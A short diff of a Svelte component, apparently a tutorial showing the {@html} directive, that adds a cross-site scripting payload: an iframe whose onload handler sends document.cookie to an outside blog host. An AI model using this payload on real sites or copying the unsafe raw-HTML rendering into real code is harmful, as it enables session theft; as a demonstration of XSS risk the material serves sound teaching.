@@ -1,9 +1,11 @@
 <script>
-
+	let h1 = '<h1>Hello Heropy</h1>';
+  let xss = '<iframe onload="document.location=`https://heropy.blog?${document.cookie}`"></iframe>';
 </script>
 
 <main>
-
+	{@html h1}
+  {@html xss}
 </main>
 
 <style>
